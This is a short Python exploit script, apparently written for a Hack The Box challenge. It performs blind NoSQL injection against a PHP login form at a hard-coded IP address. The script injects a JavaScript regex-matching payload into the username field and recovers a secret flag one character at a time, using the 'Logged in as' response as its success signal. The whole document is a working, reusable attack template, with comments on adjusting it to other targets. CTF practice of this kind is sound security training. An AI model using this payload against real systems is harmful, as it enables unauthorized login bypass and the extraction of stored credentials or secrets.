#!/usr/bin/python3
import httplib2, string, urllib.parse
from urllib.parse import quote_plus

#Adjust to the victim URL
URL = "http://83.136.253.251:42098/index.php"
#Adjust if you need less/more chars
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
http = httplib2.Http()
#Adjust if you know the string partially
flag = "HTB{"

for i in range(50): 
    for char in alphabet:
        #Adjust the JSON encoded params in the body
        params = "username=%s&password=x" % (quote_plus('" || (this.username.match(''^' +flag+char+ ') || ""=="'))
        send = http.request(URL,method="POST",headers={'Content-Type': 'application/x-www-form-urlencoded'},body=params)[1]
        #Adjust with the correct response in the blind NOSQLi response(match the response upon success)
        if ("Logged in as" in send.decode()):
            flag += char
            print("[+] Flag: " + flag)
            break
